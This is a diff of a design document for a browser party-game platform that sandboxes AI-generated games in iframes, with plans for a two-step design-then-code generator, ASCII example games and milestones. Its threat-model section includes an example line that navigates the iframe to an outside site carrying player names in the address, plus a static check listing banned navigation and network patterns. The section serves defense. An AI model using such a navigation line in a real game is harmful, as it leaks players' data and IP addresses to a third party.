@@ -847,10 +847,15 @@ After K6, the kit was still the limit, in the same way the 5 screens were before
 - **The game's logic runs in the big screen's iframe** (option B, the AirConsole model). The server only passes **events** between the big screen and the phones, and **never runs game code**.
 - **Frames only on this branch.** The block games, the kit, the GameRunner and the harness are removed, not kept side by side. The games will be new ones.
 - **The first game is new**: one the kit could never do (13g).
+- **Any kind of game (decided 2026-10-15).** Not only party rounds: an RPG, a platformer or anything else must be possible. The platform assumes as little as it can about what a game is (13h).
+- **Generation becomes two approved steps (decided 2026-10-15): design first, then code.** The model first writes a design, and you read it, ask for changes or edit it. Only the design you approve gets built (13i). This is the same plan-then-build process you use when working with Claude Code.
+- **Two more example games, with ASCII art:** a platformer and an RPG (13j). Text characters are the art, so no asset files are needed.
 
 **This reverses three earlier decisions:** Q1 (declarative views, §4a), E6 ("no generated UI code ever runs in a browser", §5), and "free HTML/JS is not built" (§12a). The protection moves from "the platform draws everything" to "the browser's sandbox walls the game in" (13e).
 
 **The big win:** today a broken or malicious AI game runs inside the server process (§11e). Then it runs inside one browser tab, walled off from the site, and the server only forwards small JSON messages.
+
+**Another win: games can make their own art.** A game can draw on a `<canvas>` or use text characters (ASCII), so it isn't limited to the approved asset library (§4b). Approved assets stay available through `party.asset(id)`.
 
 ### 13b. The big picture
 
@@ -931,8 +936,16 @@ Every walls-in measure is something the **browser** enforces, not our code:
 4. **The code arrives over the room's WebSocket** (in `game:started`), so only people in the room get it. It's put in the iframe's `srcdoc`, which needs no extra server and no second domain.
 
 **What the walls don't stop, honestly:**
-- **A game can still *draw* anything**, including a fake "log in again" form. Your review of AI games stays important. Players are guests with no passwords, so the realistic target is the host.
-- **A game can navigate its own iframe to another site** (CSP can't block that). That could leak what the game knows, like player names and drawings, but never cookies or tokens. The platform watches the iframe's `load` event and ends the game if the frame navigates away (F1).
+- **A game can still *draw* anything,** including a fake "log in again" form. **Accepted (2026-10-15):** every game is approved by the admin before anyone can play it, and players are guests with no passwords.
+- **A game can send its own iframe to another site,** for example `location.href = "https://some-site.com/?names=…"`. CSP can't block this, and neither can the sandbox. What that means:
+  1. **It can leak what the game knows** in the address: player names, drawings, typed answers. It **can't** leak cookies, logins, room tokens or the room code, because the game never gets those.
+  2. **That site sees every player's IP address,** because each phone's iframe loads it.
+  3. **An unreviewed page shows in the game's place**, possibly on the big screen. It's still sandboxed, so it can't touch our page. It could send fake events, but they go through the server's checks and can only spoil that one game.
+
+  **Defenses:**
+  - **Detect and end (F1).** The platform counts the iframe's `load` events. A second one means the frame went somewhere else: the iframe is removed and the game ends. This can't stop the first request, so the leak in point 1 still happens, but players see at most a flash.
+  - **The static check (F4)** rejects navigation in code: `location`, `window.open`, links, forms, meta refresh. This catches AI accidents, not deliberately hidden code.
+  - **Your review.** With admin approval, the worst case is a small, non-secret leak from a game approved by mistake. **Accepted (2026-10-15).**
 - **A game can hang or slow down one browser tab.** The SDK sends a heartbeat. If the big screen's game stops answering for ~5 s, the platform ends the game (F1). It can never freeze the server or other rooms.
 
 ### 13f. The server becomes a relay
@@ -948,6 +961,7 @@ Every walls-in measure is something the **browser** enforces, not our code:
 | `game:end { rankings, scores? }` | big screen → server → everyone as `game:ended` | the same checks as `endGame` today |
 
 - **Rate limits.** Continuous input, like a joystick at ~15 per second, fits the existing 20/s limit. The big screen sends one `game:send` for all phones, not one per phone. If the spike shows these limits are too tight, raise them during games.
+- **The host can always stop a game.** A "Stop game" button outside the frame ends it with no winner. Games can be long (an RPG), so the platform puts no time limit on them.
 - **If the big screen disconnects,** phones show "waiting for the host…" as today. If it comes back within 30 s, the frame restarts, and **in F0 the game ends** ("the big screen reloaded"). F1 adds save/restore (`party.save(snapshot)` kept by the server, handed back on reload).
 - **Gone from the server:** the kit, screen checks, the offered-actions check, bots, the harness, game timers. Games check phones' events themselves, as they already had to (rule 5).
 
@@ -964,33 +978,111 @@ Every walls-in measure is something the **browser** enforces, not our code:
 
   It also tests how real-time feels with the extra hop (phone → server → big screen).
 
-### 13h. What's removed on this branch
+### 13h. Any kind of game
+
+The aim is that someone can ask for a party round game, a platformer, an RPG, a puzzle, a racing game, anything. So the platform assumes as little as possible:
+- **No required shape.** There are no rounds, phases or scoreboards in the contract. The SDK only connects screens. A game only has to start, react to its players, and eventually call `party.end` (or be stopped by the host).
+- **Any player count from 1 to 12.** A solo platformer with the big screen as the TV is fine.
+- **No time limit.** The host's "Stop game" button replaces it (13f).
+- **The phone can be anything:** a joystick, a D-pad with jump, an RPG character sheet with menus, a drawing pad, or just a "buzz" button.
+- **The big screen can be anything:** a world map, a side-scrolling level, a table of cards.
+- **Templates are help, not rules.** The starter templates (13i) cover common shapes: party rounds, real-time action, turn-based adventure. A game may use one or none.
+- **Still out of scope:** joining after a game starts (D7) and saving progress between game nights. They come up naturally with RPGs; see Q17 and Q18.
+
+### 13i. Steering the AI: design first, then code
+
+**Today a job goes straight from the idea to code.** That skips the step where the game actually gets designed. The model makes design decisions while it writes code, and the only place you can see them is in the code.
+
+**The new process, two steps, each approved by you:**
+
+```
+ idea ──▶ STEP 1: design ──▶ you read it ──┬─ "change X" ──▶ new design draft ─┐
+                                           │◀────────────────────────────────────┘
+                                           ├─ edit the text yourself
+                                           └─ "Build it" ──▶ STEP 2: code (check → fix loop) ──▶ review / playtest
+```
+
+- **Step 1, the design.** The model writes a short design document from the idea, with a fixed set of headings:
+  - genre and the feel it's going for
+  - players (min/max)
+  - what the big screen shows
+  - what each phone shows and its controls
+  - the rules, step by step
+  - how it ends and who wins
+  - the art approach (canvas shapes, ASCII, or assets)
+  - which template it uses, if any
+  - edge cases: someone leaves, nobody acts, 1 player vs 12
+
+  This is quick (one model call, no code to test), and it's where most bad games can be caught.
+- **You iterate on the design.** Ask for changes (a new draft, with your feedback and the earlier draft in the prompt) or edit the text directly. Each draft is kept.
+- **Step 2, the build.** It starts only when you click **Build it**. The prompt contains the **approved design**, so the model follows a plan instead of inventing one, plus the spec, SDK reference, template and examples. The check → fix loop runs as now.
+- **Change requests go through the same two steps.** For a version change, step 1 is a short plan of *what will change and why*; you approve it, then it's built. A "skip the design" option for tiny fixes is decided in F5.
+- **Data:** versions gain a `design` text and the drafts history. New statuses: `designing` → `design_ready` → (Build it) → `generating` → `ready` / `failed`.
+- **The design step also runs in the OpenShell sandbox,** only because that's where the GenAI Studio key lives (§11a). It runs no code.
+- **Not tied to frames.** This could be built on `main` for block games too.
+
+**The other levers, roughly from most effect to least:**
+1. **Starter templates.** Skeletons where the tricky parts are already right: phases, `setState` for reconnects, checking phone events, `party.end`. The model fills in the rules and the drawing. Less code means fewer bugs and fewer surprises.
+2. **Good examples.** This was the biggest lever in both comparisons (§11g, §12j). Three hand-written games of very different kinds: Bumper Blobs (real-time, canvas), an ASCII platformer and an ASCII RPG (13j).
+3. **A helper library: "the kit as a library" (F2).** Joystick, D-pad, buttons, timer, scoreboard, drawing pad, an **ASCII grid renderer**, and the shared styles with dark mode, all provided inside the frame. Every helper is code the model doesn't write: fewer bugs, a consistent look, less room for strange code.
+4. **A frame-game rulebook in the spec (`GAME_SPEC.md`).**
+   - Everything inline: no CDN scripts, Google Fonts or outside images. LLMs do this out of habit; CSP blocks it anyway, but the rule saves failed attempts.
+   - No network, no navigation, only the `party` SDK.
+   - Phones: big tap targets, one thumb, portrait.
+   - Big screen: readable from across the room.
+   - 1–12 players must work; nothing waits forever on a player who left.
+   - A maximum file size (e.g. 150 KB), which also leaves no room for hidden blobs of code.
+5. **Checks in the fix loop (F4).** Each failure goes back to the model as a clear error, as the harness does today.
+   - **Static check:** network calls, navigation, `eval`, outside URLs.
+   - **Headless-browser playtest:** simulated phones send events. The game must start, take input, draw something (screenshot not blank) and throw no errors.
+   - Browsers report every CSP violation as an event, so the test sees a game *trying* to reach the network, not just failing to.
+   - Long games (an RPG) don't have to finish in the test. The test plays for a while and then checks the host's stop works.
+6. **Review help on the admin page (F4).** Screenshots of the phone and the big screen from the browser test, the check results, and flagged lines highlighted.
+
+**On malicious code:** the model isn't trying to attack anyone. The realistic risks are its habits (CDN scripts, outside fonts) and, from A7 on, other people's ideas containing instructions aimed at the model. The templates, rulebook and static check handle the first; the sandbox, CSP and admin approval handle the second.
+
+### 13j. Example games (hand-written, also the AI's examples)
+
+| Game | Kind | Big screen | Phones | Players |
+|---|---|---|---|---|
+| **Bumper Blobs** (F0) | Real-time party | An ice arena on a canvas at 60 fps | A joystick | 2–12 |
+| **ASCII platformer**, e.g. "Tower Dash" (F3) | Real-time platformer | A side-on level made of text: `#` walls, `=` platforms, `^` spikes, `$` coins, `>` the exit. Each player is a coloured letter | Left, right, jump | 1–8: race to the exit, coins break ties; 3 levels |
+| **ASCII RPG**, e.g. "Dungeon Party" (F3) | Turn-based co-op adventure | A dungeon map in text (`@` heroes, `g` goblins, `D` the dragon) and a battle log | Each player's hero: HP, items, and a menu of moves on their turn | 1–6: explore rooms, fight, beat the boss; scores from damage dealt and gold |
+
+The two ASCII games also stress-test the SDK for genres that aren't party rounds, before the AI is asked to make them.
+
+### 13k. What's removed on this branch
 
 - **Server:** `GameRunner.js`, `contract.js`, `kit/`, `harness/`, the four block games, `game:action`, `/api/kit`. Also the screen-size and widget settings in `config.js`.
 - **Client:** `game/blocks/`, `GameScreen.jsx`, the `/kit` page and its link from the home page.
-- **Generator:** its prompt, spec and examples are written for blocks. **Generation is switched off on the branch until F4** ("not available for frame games yet"). The admin page, versions, diffs and the sandbox stay.
+- **Generator:** its prompt, spec and examples are written for blocks. **Generation is switched off on the branch until F5** ("not available for frame games yet"). The admin page, versions, diffs and the sandbox stay.
 - **Stored AI games** (Silly Sketch, Reflex Frenzy) are block games. They fail their load check and are skipped. They aren't deleted, so `main` can still run them from the same database.
 - **No database changes in F0.**
 
-### 13i. Milestones (branch `iframe-games`)
+### 13l. Milestones (branch `iframe-games`)
 
 | M | Goal | You can run / review |
 |---|---|---|
-| **F0 Spike** | Remove the block games (13h); `FrameRelay` + the new messages; `GameFrame.jsx` (srcdoc wrapper, CSP, message checks); the `party` SDK basics; Bumper Blobs; tests: relay unit tests, and e2e tests that play a round and prove the walls (the iframe can't read the cookie or storage, `fetch` is blocked) | Play Bumper Blobs on the big screen with 2+ real phones (Tailscale works). **Go/no-go:** does it feel smooth, and is it worth the cost? |
-| **F1 Robustness** | Sticky state replay on reconnect; big screen save/restore; heartbeat (hung frame → game ends); frame navigation → game ends; tune rate limits | Refresh a phone and the big screen mid-game; a deliberately broken game ends cleanly |
-| **F2 Look and feel** | A platform base stylesheet inside frames (colour tokens, buttons, dark mode from `party.theme`), plus small helpers ("kit as a library": scoreboard, timer, drawing pad), so games look like BoilerGames without having to | A plain game looks right in both themes |
-| **F3 Checking games** | A harness that loads a game in a **headless browser** with simulated phones, plus a light static check. Needs Chromium in the generator image (ask before adding Playwright there) | `npm run check-game game.html` passes Bumper Blobs; broken fixtures fail clearly |
-| **F4 Generator on frames** | Spec, SDK reference and examples rewritten; generation switched back on; `/kit` comes back as the SDK docs | `npm run generate` makes a frame game that passes and is fun |
+| **F0 Spike** | Remove the block games (13k); `FrameRelay` + the new messages; `GameFrame.jsx` (srcdoc wrapper, CSP, message checks); the `party` SDK basics; Bumper Blobs; tests: relay unit tests, and e2e tests that play a round and prove the walls (the iframe can't read the cookie or storage, `fetch` is blocked) | Play Bumper Blobs on the big screen with 2+ real phones (Tailscale works). **Go/no-go:** does it feel smooth, and is it worth the cost? |
+| **F1 Robustness** | Sticky state replay on reconnect; big screen save/restore; heartbeat (hung frame → game ends); frame navigation → game ends (13e); the host's "Stop game" button; tune rate limits | Refresh a phone and the big screen mid-game; a deliberately broken or redirecting game ends cleanly |
+| **F2 Look and feel + helpers** | The kit as a library inside frames: base stylesheet (colour tokens, buttons, dark mode from `party.theme`), joystick, D-pad, timer, scoreboard, drawing pad, ASCII grid renderer | A plain game looks right in both themes; Bumper Blobs uses the shared joystick |
+| **F3 Example games + templates** | The ASCII platformer and the ASCII RPG (13j); starter templates (party rounds, real-time, turn-based adventure) taken from the three games | Play both with phones; each template runs as a tiny working game |
+| **F4 Checking games** | Static check plus a **headless-browser** playtest with simulated phones, CSP violation reports and screenshots; screenshots and flags on the admin page. Needs Chromium in the generator image (ask before adding Playwright there) | `npm run check-game game.html` passes the three examples; broken fixtures (network, navigation, throws, blank screen) fail clearly |
+| **F5 Two-step generator** | Design step (13i), design drafts and edits on the admin page, "Build it"; spec rulebook, SDK reference, templates and examples in the prompt; change requests as plan → build; generation switched back on; `/kit` comes back as the SDK docs | Idea → read the design → ask for a change → Build it → a frame game that passes and is fun (try a platformer and an RPG idea) |
 | **Decide** | Rebase onto `main` (this becomes the plan) or drop the branch | |
 
-### 13j. Risks and open questions
+### 13m. Risks and open questions
 
 - **The big screen is the referee.** A slow or busy host laptop slows the game for everyone, and browsers slow down timers in background tabs, so the big screen tab must stay in front.
 - **Latency:** phone → server → big screen is one hop more than block games. On the same Wi-Fi that's tens of milliseconds. Bumper Blobs will show whether it's noticeable.
-- **AI-written UI** is more code to get wrong and more to review. F3 (testing in a real browser) matters more than the harness did.
+- **AI-written UI** is more code to get wrong and more to review. F4 (testing in a real browser) matters more than the harness did.
 - **Phones:** canvas games on cheap phones, battery, and audio (browsers only play sound after a tap).
+- **Long games** (an RPG) make a big-screen refresh more painful, so F1's save/restore matters more.
+- **Bigger designs, bigger files.** An RPG is more code than a party round. Keep an eye on the file-size cap, the prompt size and qwen's time per attempt.
 - **Q15:** should phones also be able to save/restore their own frame state, or is the big screen's sticky state enough? Decide in F1.
 - **Q16:** keep a way to run the old block games (e.g. as a frame game that draws blocks), or let them go for good? Decide at the merge.
+- **Q17:** let players join a game that's already running (drop-in for RPGs)? D7 says no for now.
+- **Q18:** save a game's progress between game nights (an RPG campaign)? Would need storage per game; out of scope for now.
 
 ---
 
